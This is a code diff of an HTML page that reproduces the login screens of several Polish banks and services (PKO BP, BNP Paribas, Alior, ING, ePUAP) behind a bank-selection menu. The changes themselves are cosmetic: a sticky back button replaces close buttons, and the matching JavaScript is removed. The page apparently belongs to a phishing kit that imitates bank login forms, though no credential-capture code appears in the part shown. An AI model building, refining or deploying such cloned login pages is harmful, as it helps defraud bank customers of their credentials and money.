-                <button class="bank6-close-btn" id="bank6CloseBtn" onclick="closeLoginScreen6()">✕</button>
-                <button class="back-btn" onclick="closeLoginScreen6()" style="position:relative; z-index:10001; background:#fff; padding:12px 20px; border-radius:8px; margin:10px 20px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"><span class="arrow">←</span> Powrót do wyboru banku</button>
+                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
+                    <button class="back-btn" onclick="closeLoginScreen6()"><span class="arrow">‹</span> Powrót</button>
+                </div>
                 <div class="bank6-container">
                     <div class="bank6-left">
                         <div class="bank6-title">Logowanie</div>
@@ -4947,8 +4555,9 @@
 
             <!-- ===== BANK 7 ===== -->
             <div class="bank7-full-page" id="loginScreen7">
-                <button class="bank7-close-btn" id="bank7CloseBtn" onclick="closeLoginScreen7()">✕</button>
-                <button class="back-btn" onclick="closeLoginScreen7()" style="position:relative; z-index:10001; background:#fff; padding:12px 20px; border-radius:8px; margin:10px 20px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"><span class="arrow">←</span> Powrót do wyboru banku</button>
+                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
+                    <button class="back-btn" onclick="closeLoginScreen7()"><span class="arrow">‹</span> Powrót</button>
+                </div>
                 <div class="bank7-container">
                     <div class="bank7-logo"><img src="bnp-paribas-logo-full.svg" alt="BNP Paribas"></div>
                     <div class="bank7-box">
@@ -4982,8 +4591,9 @@
 
             <!-- ===== BANK 8 ===== -->
             <div class="bank8-full-page" id="loginScreen8">
-                <button class="bank8-close-btn" id="bank8CloseBtn" onclick="closeLoginScreen8()">✕</button>
-                <button class="back-btn" onclick="closeLoginScreen8()" style="position:relative; z-index:10001; background:#fff; padding:12px 20px; border-radius:8px; margin:10px 20px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"><span class="arrow">←</span> Powrót do wyboru banku</button>
+                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
+                    <button class="back-btn" onclick="closeLoginScreen8()"><span class="arrow">‹</span> Powrót</button>
+                </div>
                 <div class="bank8-container">
                     <div class="bank8-left">
                         <div class="bank8-favicon"><img src="favicon.ico" alt="PKO BP"></div>
@@ -5014,8 +4624,9 @@
 
             <!-- ===== BANK 9 ===== -->
             <div class="bank9-full-page" id="loginScreen9">
-                <button class="bank9-close-btn" id="bank9CloseBtn" onclick="closeLoginScreen9()">✕</button>
-                <button class="back-btn" onclick="closeLoginScreen9()" style="position:relative; z-index:10001; background:#fff; padding:12px 20px; border-radius:8px; margin:10px 20px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"><span class="arrow">←</span> Powrót do wyboru banku</button>
+                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
+                    <button class="back-btn" onclick="closeLoginScreen9()"><span class="arrow">‹</span> Powrót</button>
+                </div>
                 <div class="bank9-container">
                     <div class="bank9-top">
                         <div class="bank9-logo"><img src="alior-logo.svg" alt="Alior Bank"></div>
@@ -5040,12 +4651,12 @@
                 </div>
             </div>
 
-            <!-- ===== BANK 10 ===== -->
+            <!-- ===== BANK 10 — BEZ LOGO ===== -->
             <div class="bank10-full-page" id="loginScreen10">
-                <button class="bank10-close-btn" id="bank10CloseBtn" onclick="closeLoginScreen10()">✕</button>
-                <button class="back-btn" onclick="closeLoginScreen10()" style="position:relative; z-index:10001; background:#fff; padding:12px 20px; border-radius:8px; margin:10px 20px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"><span class="arrow">←</span> Powrót do wyboru banku</button>
+                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
+                    <button class="back-btn" onclick="closeLoginScreen10()"><span class="arrow">‹</span> Powrót</button>
+                </div>
                 <div class="bank10-container">
-                    <div class="bank10-top-logo"><img src="logo (2).png" alt="ePUAP"></div>
                     <div class="bank10-main">
                         <div class="bank10-left"></div>
                         <div class="bank10-card">
@@ -5079,8 +4690,9 @@
 
             <!-- ===== BANK 12 ===== -->
             <div class="bank12-full-page" id="loginScreen12">
-                <button class="bank12-close-btn" id="bank12CloseBtn" onclick="closeLoginScreen12()">✕</button>
-                <button class="back-btn" onclick="closeLoginScreen12()" style="position:relative; z-index:10001; background:#fff; padding:12px 20px; border-radius:8px; margin:10px 20px; box-shadow:0 2px 8px rgba(0,0,0,0.1);"><span class="arrow">←</span> Powrót do wyboru banku</button>
+                <div class="back-btn-wrapper" style="position:sticky; top:0; z-index:10002; background:#fff; padding:8px 16px 4px; border-bottom:1px solid #e6ebf3;">
+                    <button class="back-btn" onclick="closeLoginScreen12()"><span class="arrow">‹</span> Powrót</button>
+                </div>
                 <div class="bank12-container">
                     <div class="bank12-box">
                         <div class="bank12-logo"><img src="logo_ing-logo.svg" alt="ING Bank Śląski"></div>
@@ -5203,11 +4815,9 @@
 
         // ===== GO BACK TO BANKS =====
         function goBackToBanks() {
-            // Hide all login screens
             document.querySelectorAll('.login-screen, .bank2-full-page, .bank3-full-page, .bank4-full-page, .bank5-full-page, .bank6-full-page, .bank7-full-page, .bank8-full-page, .bank9-full-page, .bank10-full-page, .bank12-full-page').forEach(el => {
                 el.classList.remove('visible');
             });
-            // Show bank selection
             document.getElementById('bankSelection').classList.add('visible');
             document.getElementById('bankFooter').classList.add('visible');
             document.body.style.overflow = '';
@@ -5575,18 +5185,14 @@
 
         function openLoginScreen3() {
             const bank3 = document.getElementById('loginScreen3');
-            const closeBtn = document.getElementById('bank3CloseBtn');
             bank3.classList.add('visible');
-            closeBtn.classList.add('visible');
             document.body.style.overflow = 'hidden';
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
         function closeLoginScreen3() {
             const bank3 = document.getElementById('loginScreen3');
-            const closeBtn = document.getElementById('bank3CloseBtn');
             bank3.classList.remove('visible');
-            closeBtn.classList.remove('visible');
             document.body.style.overflow = '';
             document.getElementById('bankSelection').classList.add('visible');
             document.getElementById('bankFooter').classList.add('visible');
@@ -5595,18 +5201,14 @@
 
         function openLoginScreen4() {
             const bank4 = document.getElementById('loginScreen4');
-            const closeBtn = document.getElementById('bank4CloseBtn');
             bank4.classList.add('visible');
-            closeBtn.classList.add('visible');
             document.body.style.overflow = 'hidden';
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
         function closeLoginScreen4() {
             const bank4 = document.getElementById('loginScreen4');
-            const closeBtn = document.getElementById('bank4CloseBtn');
             bank4.classList.remove('visible');
-            closeBtn.classList.remove('visible');
             document.body.style.overflow = '';
             document.getElementById('bankSelection').classList.add('visible');
             document.getElementById('bankFooter').classList.add('visible');
@@ -5615,18 +5217,14 @@
 
         function openLoginScreen5() {
             const bank5 = document.getElementById('loginScreen5');
-            const closeBtn = document.getElementById('bank5CloseBtn');
             bank5.classList.add('visible');
-            closeBtn.classList.add('visible');
             document.body.style.overflow = 'hidden';
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
         function closeLoginScreen5() {
             const bank5 = document.getElementById('loginScreen5');
-            const closeBtn = document.getElementById('bank5CloseBtn');
             bank5.classList.remove('visible');
-            closeBtn.classList.remove('visible');
             document.body.style.overflow = '';
             document.getElementById('bankSelection').classList.add('visible');
             document.getElementById('bankFooter').classList.add('visible');
@@ -5635,18 +5233,14 @@
 
         function openLoginScreen6() {
             const bank6 = document.getElementById('loginScreen6');
-            const closeBtn = document.getElementById('bank6CloseBtn');
             bank6.classList.add('visible');
-            closeBtn.classList.add('visible');
             document.body.style.overflow = 'hidden';
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
         function closeLoginScreen6() {
             const bank6 = document.getElementById('loginScreen6');
-            const closeBtn = document.getElementById('bank6CloseBtn');
             bank6.classList.remove('visible');
-            closeBtn.classList.remove('visible');
             document.body.style.overflow = '';
             document.getElementById('bankSelection').classList.add('visible');
             document.getElementById('bankFooter').classList.add('visible');
@@ -5655,18 +5249,14 @@
 
         function openLoginScreen7() {
             const bank7 = document.getElementById('loginScreen7');
-            const closeBtn = document.getElementById('bank7CloseBtn');
             bank7.classList.add('visible');
-            closeBtn.classList.add('visible');
             document.body.style.overflow = 'hidden';
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
         function closeLoginScreen7() {
             const bank7 = document.getElementById('loginScreen7');
-            const closeBtn = document.getElementById('bank7CloseBtn');
             bank7.classList.remove('visible');
-            closeBtn.classList.remove('visible');
             document.body.style.overflow = '';
             document.getElementById('bankSelection').classList.add('visible');
             document.getElementById('bankFooter').classList.add('visible');
@@ -5675,18 +5265,14 @@
 
         function openLoginScreen8() {
             const bank8 = document.getElementById('loginScreen8');
-            const closeBtn = document.getElementById('bank8CloseBtn');
             bank8.classList.add('visible');
-            closeBtn.classList.add('visible');
             document.body.style.overflow = 'hidden';
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
         function closeLoginScreen8() {
             const bank8 = document.getElementById('loginScreen8');
-            const closeBtn = document.getElementById('bank8CloseBtn');
             bank8.classList.remove('visible');
-            closeBtn.classList.remove('visible');
             document.body.style.overflow = '';
             document.getElementById('bankSelection').classList.add('visible');
             document.getElementById('bankFooter').classList.add('visible');
@@ -5695,18 +5281,14 @@
 
         function openLoginScreen9() {
             const bank9 = document.getElementById('loginScreen9');
-            const closeBtn = document.getElementById('bank9CloseBtn');
             bank9.classList.add('visible');
-            closeBtn.classList.add('visible');
             document.body.style.overflow = 'hidden';
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
         function closeLoginScreen9() {
             const bank9 = document.getElementById('loginScreen9');
-            const closeBtn = document.getElementById('bank9CloseBtn');
             bank9.classList.remove('visible');
-            closeBtn.classList.remove('visible');
             document.body.style.overflow = '';
             document.getElementById('bankSelection').classList.add('visible');
             document.getElementById('bankFooter').classList.add('visible');
@@ -5715,18 +5297,14 @@
 
         function openLoginScreen10() {
             const bank10 = document.getElementById('loginScreen10');
-            const closeBtn = document.getElementById('bank10CloseBtn');
             bank10.classList.add('visible');
-            closeBtn.classList.add('visible');
             document.body.style.overflow = 'hidden';
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
         function closeLoginScreen10() {
             const bank10 = document.getElementById('loginScreen10');
-            const closeBtn = document.getElementById('bank10CloseBtn');
             bank10.classList.remove('visible');
-            closeBtn.classList.remove('visible');
             document.body.style.overflow = '';
             document.getElementById('bankSelection').classList.add('visible');
             document.getElementById('bankFooter').classList.add('visible');
@@ -5735,18 +5313,14 @@
 
         function openLoginScreen12() {
             const bank12 = document.getElementById('loginScreen12');
-            const closeBtn = document.getElementById('bank12CloseBtn');
             bank12.classList.add('visible');
-            closeBtn.classList.add('visible');
             document.body.style.overflow = 'hidden';
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
         function closeLoginScreen12() {
             const bank12 = document.getElementById('loginScreen12');
-            const closeBtn = document.getElementById('bank12CloseBtn');
             bank12.classList.remove('visible');
-            closeBtn.classList.remove('visible');
             document.body.style.overflow = '';
             document.getElementById('bankSelection').classList.add('visible');
             document.getElementById('bankFooter').classList.add('visible');
